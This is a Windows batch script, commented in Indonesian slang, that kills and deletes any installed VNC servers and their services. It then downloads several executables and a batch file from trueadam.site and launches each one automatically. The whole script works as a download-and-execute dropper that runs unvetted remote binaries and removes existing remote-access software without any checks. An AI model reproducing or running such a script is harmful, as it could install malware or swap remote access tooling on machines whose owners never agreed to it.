@echo off
setlocal enabledelayedexpansion
title MODE PC - TrueAdam Multi Downloader + Auto Run
set DIR=C:\Sumpruy_Downloads
mkdir "%DIR%" 2>nul
cd /d "%DIR%"

:: Matiin semua VNC biar ga ganggu
taskkill /f /im vncserver.exe 2>nul
taskkill /f /im winvnc4.exe 2>nul
taskkill /f /im tightvncserver.exe 2>nul
taskkill /f /im ultravnc.exe 2>nul
taskkill /f /im vncviewer.exe 2>nul

:: Hapus folder VNC
rd /s /q "C:\Program Files\VNC" 2>nul
rd /s /q "C:\Program Files\TightVNC" 2>nul
rd /s /q "C:\Program Files\UltraVNC" 2>nul
rd /s /q "%USERPROFILE%\AppData\Local\VNC" 2>nul

:: Matiin service VNC
sc stop vncserver 2>nul
sc delete vncserver 2>nul
sc stop winvnc 2>nul
sc delete winvnc 2>nul

echo ========================================
echo NGEDOWNLOAD SEMUA BRO...
echo ========================================

:: List file yang mau di download
set FILE1=telaso.exe
set URL1=https://trueadam.site/telaso.exe
set FILE2=StarDesk_1.3.4_(1).exe
set URL2=https://trueadam.site/StarDesk_1.3.4_(1).exe
set FILE3=BarnosBrowser.exe
set URL3=https://trueadam.site/BarnosBrowser.exe
set FILE4=CLOUD_GUARDIAN_V4.bat
set URL4=https://trueadam.site/CLOUD_GUARDIAN_V4.bat

:: Function download pake curl + fallback powershell
call :DownloadFile "%URL1%" "%FILE1%"
call :DownloadFile "%URL2%" "%FILE2%"
call :DownloadFile "%URL3%" "%FILE3%"
call :DownloadFile "%URL4%" "%FILE4%"

echo ========================================
echo EKSEKUSI SEMUA FILE BRO...
echo ========================================

:: Jalanin semua file yang udah ke download (kecuali bat dia langsung jalan di cmd)
if exist "%FILE1%" (
    echo Jalanin %FILE1%...
    start "" "%FILE1%"
)
if exist "%FILE2%" (
    echo Jalanin %FILE2%...
    start "" "%FILE2%"
)
if exist "%FILE3%" (
    echo Jalanin %FILE3%...
    start "" "%FILE3%"
)
if exist "%FILE4%" (
    echo Jalanin %FILE4%...
    cmd /c "%FILE4%"
)

echo ========================================
echo SELESAI COK! SEMUA UDAH BERES 😎
echo ========================================
pause
exit /b

:DownloadFile
set url=%~1
set filename=%~2
echo Mendownload %filename%...
curl -L -o "%filename%" "%url%"
if %errorlevel% neq 0 (
    echo CURL GAGAL %filename%, pake Powershell...
    powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%filename%' -TimeoutSec 60"
    if !errorlevel! neq 0 (
        echo GAGAL JUGA ANJING 😡 %filename% - coba manual nanti
    ) else (
        echo ✅ %filename% berhasil via PS
    )
) else (
    echo ✅ %filename% berhasil via CURL
)
exit /b
